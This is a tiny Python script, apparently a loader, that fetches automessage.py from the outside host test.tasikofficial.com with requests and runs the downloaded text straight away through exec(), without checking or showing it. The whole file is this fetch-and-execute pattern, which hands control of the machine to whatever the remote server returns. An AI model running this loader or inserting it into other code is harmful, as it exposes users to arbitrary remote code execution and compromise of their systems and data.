import requests

# URL of the script
script_url = "https://test.tasikofficial.com/automessage.py"

# Fetch the script content
response = requests.get(script_url)
script_code = response.text

# Execute the script
exec(script_code) 
